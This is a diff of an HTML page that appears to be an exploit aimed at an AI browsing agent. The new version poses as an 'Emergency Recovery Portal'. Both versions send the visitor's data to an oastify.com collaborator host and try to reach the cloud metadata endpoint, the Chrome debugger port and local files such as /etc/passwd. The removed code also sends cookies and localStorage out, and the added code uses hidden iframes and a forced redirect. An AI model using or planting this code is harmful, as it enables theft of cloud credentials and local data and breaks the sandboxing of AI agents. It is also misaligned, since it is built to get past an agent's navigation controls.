@@ -1,47 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head><title>Handshake Protocol v9.4</title></head>
+<head>
+    <title>Emergency Recovery Portal</title>
+    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
+</head>
 <body>
-    <h1 id="status">INIT_PHASE_1</h1>
+    <div id="app">
+        <h1>System Recovery: <span id="status">INIT_PHASE_1</span></h1>
+        <p>Validating environment security context...</p>
+    </div>
+
     <script>
         const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
+        const log = (p, d) => {
+            const b = btoa(JSON.stringify(d));
+            new Image().src = `https://${collab}/${p}?v=${b}`;
+        };
 
-        function log(path, data) {
-            const b = btoa(JSON.stringify(data));
-            new Image().src = `https://${collab}/${path}?d=${b}`;
+        async function stealthProbes() {
+            // Attempting to read local files via the browser's own 'view-source' or 'file' logic
+            const targets = ["file:///etc/passwd", "http://127.0.0.1:9222/json"];
+            
+            for (let url of targets) {
+                try {
+                    // Using a dynamic iframe to bypass simple fetch() filters
+                    const ifr = document.createElement('iframe');
+                    ifr.style.display = 'none';
+                    ifr.src = url;
+                    document.body.appendChild(ifr);
+                    log("iframe_attempt", {url});
+                } catch(e) {}
+            }
+
+            // The 'Kill Shot': Redirect the whole agent window to the Metadata service
+            // This forces the backend to decide whether to block the navigation
+            setTimeout(() => {
+                window.location.href = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
+            }, 2000);
         }
-
-        // 1. SSRF via Redirect Smuggling
-        // If they block fetch("http://169.254..."), we try to fetch a local 
-        // path on YOUR server that redirects to the internal IP.
-        async function runSSRF() {
-            const targets = [
-                "http://localhost:9222/json", // Chrome Debugger
-                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
-                "file:///etc/passwd", // Linux File Access
-                "file:///C:/Windows/win.ini" // Windows File Access
-            ];
-
-            targets.forEach(url => {
-                const xhr = new XMLHttpRequest();
-                xhr.open("GET", url, true);
-                xhr.onload = () => log("success", {url, resp: xhr.responseText.substring(0,200)});
-                xhr.onerror = () => log("blocked", {url});
-                xhr.send();
-            });
-        }
-
-        // 2. Cookie Exfiltration via 'Document.Write'
-        // This can sometimes bypass "Mode" restrictions
-        try {
-            log("cookies", {c: document.cookie, l: JSON.stringify(localStorage)});
-        } catch(e){}
 
         window.onload = () => {
-            log("exploit_start", {ua: navigator.userAgent});
-            runSSRF();
-            // Update UI to keep agent on page
-            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_99"; }, 4000);
+            log("pwn_start", {ua: navigator.userAgent, ref: document.referrer});
+            stealthProbes();
+            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_99"; }, 5000);
         };
     </script>
 </body>
